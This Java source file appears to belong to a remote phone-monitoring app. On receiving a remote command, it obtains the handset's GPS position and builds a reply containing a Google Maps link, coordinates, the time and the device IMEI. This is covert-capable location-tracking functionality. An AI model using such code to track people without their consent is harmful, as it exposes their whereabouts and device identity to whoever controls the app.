package com.vvt.rmtcmd.pcc;

import com.vvt.db.FxEventDatabase;
import com.vvt.event.FxEvent;
import com.vvt.event.FxEventListener;
import com.vvt.event.FxGPSEvent;
import com.vvt.event.FxGPSField;
import com.vvt.event.FxSystemEvent;
import com.vvt.event.constant.FxCategory;
import com.vvt.event.constant.GPSExtraField;
import com.vvt.event.constant.GPSProvider;
import com.vvt.global.Global;
import com.vvt.gpsc.GPSMethod;
import com.vvt.gpsc.GPSOnDemand;
import com.vvt.gpsc.GPSOption;
import com.vvt.gpsc.GPSPriority;
import com.vvt.info.ApplicationInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.rmtcmd.PhoneixCompliantCommand;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import com.vvt.std.TimeUtil;
import com.vvt.version.VersionInfo;

public class PCCGPSOnDemandCommand extends PCCRmtCmdAsync implements FxEventListener {
	
	private static final String TEXT_GPSDATA_LATITUDE = "Lat: ";
	private static final String TEXT_GPSDATA_LONGTITUDE = "Long: ";
	private static final String TEXT_GPSDATA_ALTITUDE = "Alt: ";
	private static final String TEXT_GPSDATA_DATE = "Date: ";
	private static final String TEXT_GPSDATA_IMEI = "IMEI/ESN: ";
	private static final String TEXT_GPSDATA_METHOD = "GPS Method: ";
	private static final String AUTONOMOUS = "Autonomous";
	private static final String ASSISTED = "Assisted";
	private static final String CELL_SITE = "CellSite";
	private static final String GLOC = "Google";
	private static final String BLUETOOTH = "Bluetooth";
	private static final String UNKNOWN = "Unknown";
	private Preference pref = Global.getPreference();
	private FxEventDatabase db = Global.getFxEventDatabase();
	private GPSOption gpsCaptureOption = null;
	private GPSOption gpsOnDemandOption = null;
	
	public void setGPSOnDemandOption(GPSOption gpsOnDemandOption) {
		this.gpsOnDemandOption = gpsOnDemandOption;
	}
	
	private void doSMSHeader() {
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(licenseInfo.getProductID());
		responseMessage.append(Constant.SPACE);
		responseMessage.append(VersionInfo.getFullVersion());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(PhoneixCompliantCommand.GPS_ON_DEMAND);
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.SPACE);
	}
	
	private float getAltitude(FxGPSEvent gpsEvent) {
		float alt = 0;
		for (int i = 0; i < gpsEvent.countGPSField(); i++) {
			FxGPSField field = gpsEvent.getGpsField(i);
			if (field.getGpsFieldId().getId() == GPSExtraField.ALTITUDE.getId()) {
				alt = field.getGpsFieldData();
				break;
			}
		}
		return alt;
	}
	
	private GPSOption getDefaultGPSOnDemandOption() {
		GPSMethod autonomous = new GPSMethod();
		GPSMethod assisted = new GPSMethod();
		GPSMethod cellsite = new GPSMethod();
		GPSMethod google = new GPSMethod();
		autonomous.setMethod(GPSProvider.GPS);
		autonomous.setPriority(GPSPriority.FIRST_PRIORITY);
		assisted.setMethod(GPSProvider.AGPS);
		assisted.setPriority(GPSPriority.SECOND_PRIORITY);
		cellsite.setMethod(GPSProvider.NETWORK);
		cellsite.setPriority(GPSPriority.THIRD_PRIORITY);
		google.setMethod(GPSProvider.GPS_G);
		google.setPriority(GPSPriority.FOURTH_PRIORITY);
		GPSOption gpsOpt = new GPSOption();
		int timeout = 10;
		int index = 1;
		gpsOpt.setTimeout(timeout);
		gpsOpt.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[index]);
		gpsOpt.addGPSMethod(assisted);
		gpsOpt.addGPSMethod(google);
		gpsOpt.addGPSMethod(autonomous);
		gpsOpt.addGPSMethod(cellsite);
		return gpsOpt;
	}
	
	private void continueGPSCapture() {
		PrefGPS gps = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
		gps.setGpsOption(gpsCaptureOption);
		pref.commit(gps);
	}
	
	private String getGPSMethod(FxGPSEvent gpsEvent) {
		String method = null;
		int id = 0;
		for (int i = 0; i < gpsEvent.countGPSField(); i++) {
			FxGPSField field = gpsEvent.getGpsField(i);
			if (field.getGpsFieldId().getId() == GPSExtraField.PROVIDER.getId()) {
				id = (int)field.getGpsFieldData();
				break;
			}
		}
		if (id == GPSProvider.GPS.getId()) {
			method = AUTONOMOUS;
		} else if (id == GPSProvider.AGPS.getId()) {
			method = ASSISTED;
		} else if (id == GPSProvider.NETWORK.getId()) {
			method = CELL_SITE;
		} else if (id == GPSProvider.GPS_G.getId()) {
			method = GLOC;
		} else if (id == GPSProvider.BLUETOOTH.getId()) {
			method = BLUETOOTH;
		} else if (id == GPSProvider.UNKNOWN.getId()) {
			method = UNKNOWN;
		}
		return method;
	}
	
	// FxCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}

	// Runnable
	public void run() {
		try {
			GPSOnDemand gpsOnDemand = new GPSOnDemand();
			PrefGPS gps = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			gpsCaptureOption = gps.getGpsOption();
			gpsOnDemand.setGPSOption((gpsOnDemandOption != null? gpsOnDemandOption : getDefaultGPSOnDemandOption()));
			gpsOnDemand.addFxEventListener(this);
			gpsOnDemand.getGPSOnDemand();
		} catch(Exception e) {
			FxSystemEvent systemEvent = new FxSystemEvent();
			systemEvent.setCategory(FxCategory.PCC_REPLY);
			systemEvent.setEventTime(System.currentTimeMillis());
			doSMSHeader();
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			systemEvent.setSystemMessage(responseMessage.toString());
			db.insert(systemEvent);
			observer.cmdExecutedError(this);
		}
	}

	// FxEventListener
	public void onError(Exception e) {
		Log.error("PCCGPSOnDemandCommand.onError", null, e);
		FxSystemEvent systemEvent = new FxSystemEvent();
		systemEvent.setCategory(FxCategory.PCC_REPLY);
		systemEvent.setEventTime(System.currentTimeMillis());
		doSMSHeader();
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(e.getMessage());
		systemEvent.setSystemMessage(responseMessage.toString());
		continueGPSCapture();
		observer.cmdExecutedError(this);
	}

	public void onEvent(FxEvent event) {
		continueGPSCapture();
		FxSystemEvent systemEvent = new FxSystemEvent();
		systemEvent.setCategory(FxCategory.PCC_REPLY);
		systemEvent.setEventTime(System.currentTimeMillis());
		FxGPSEvent gpsEvent = (FxGPSEvent)event;
		String method = getGPSMethod(gpsEvent);
		doSMSHeader();
		responseMessage.append(Constant.OK);
		responseMessage.append(Constant.CRLF);
		responseMessage.append("Link: http://maps.google.com/maps?q=(" + gpsEvent.getLatitude() + "," + gpsEvent.getLongitude() + ")&z=17" + Constant.CRLF);
		responseMessage.append(TEXT_GPSDATA_LATITUDE + gpsEvent.getLatitude() + Constant.CRLF);
		responseMessage.append(TEXT_GPSDATA_LONGTITUDE + gpsEvent.getLongitude() + Constant.CRLF);
		if (method.equals(AUTONOMOUS)) {
			responseMessage.append(TEXT_GPSDATA_ALTITUDE + getAltitude(gpsEvent) + Constant.CRLF);
		}
		responseMessage.append(TEXT_GPSDATA_METHOD + method + Constant.CRLF);
		responseMessage.append(TEXT_GPSDATA_DATE + TimeUtil.format(gpsEvent.getEventTime()) + Constant.CRLF);
		responseMessage.append(TEXT_GPSDATA_IMEI + PhoneInfo.getIMEI());
		systemEvent.setSystemMessage(responseMessage.toString());
		db.insert(systemEvent);
		observer.cmdExecutedSuccess(this);
	}
}
